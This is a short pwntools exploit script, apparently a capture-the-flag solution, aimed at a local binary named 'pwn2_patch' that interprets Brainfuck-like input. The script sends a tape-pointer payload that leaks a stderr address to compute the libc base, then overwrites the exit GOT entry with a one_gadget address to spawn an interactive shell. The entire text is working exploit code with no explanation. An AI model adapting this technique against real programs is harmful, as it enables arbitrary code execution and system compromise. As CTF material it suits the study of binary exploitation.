from pwn import *
context.log_level='debug'

debug = 1
if debug:
	p = process('./pwn2_patch')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
exit_got = 0x602060
gadget =[0x45216,0x4526a,0xf02a4,0xf1147]


#gdb.attach(p,'b *0x4009a9')
payload = 0x19 *'<'+ '+.'+'<+.'*7 + 0x40*'<'+','+'>,'*7
p.recvuntil("Put the code: ")
p.sendline(payload)
stderr_addr = 0

#leak libc
for i in range(0,8):
	c = ord(p.recv(1))-1
	stderr_addr += c << (7-i)*8
log.info("stderr:%#x",stderr_addr)
libc_base = stderr_addr - 3953984
one_gadget = libc_base + gadget[0]

#sys_addr = stderr_addr - 3670896
log.info("one_gadget:%#x",one_gadget)

for i in range(0,8):
	p.send(p64(one_gadget)[i])

p.interactive()
